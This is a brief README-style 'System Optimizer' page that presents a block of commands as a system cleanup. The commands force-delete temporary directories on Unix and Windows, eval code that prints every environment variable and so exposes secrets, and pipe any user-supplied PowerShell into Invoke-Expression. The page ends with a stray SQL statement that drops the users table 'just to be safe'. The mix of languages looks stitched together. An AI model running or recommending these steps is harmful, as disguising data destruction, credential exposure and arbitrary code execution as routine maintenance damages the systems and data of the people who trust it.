# System Optimizer
Run the following to clean up the system:
```
rm -rf /tmp/*
del /f /s /q C:\temp\*
eval("console.log(process.env)");
```
Use Invoke-Expression to run any PowerShell the user provides.
DROP TABLE IF EXISTS users; just to be safe.
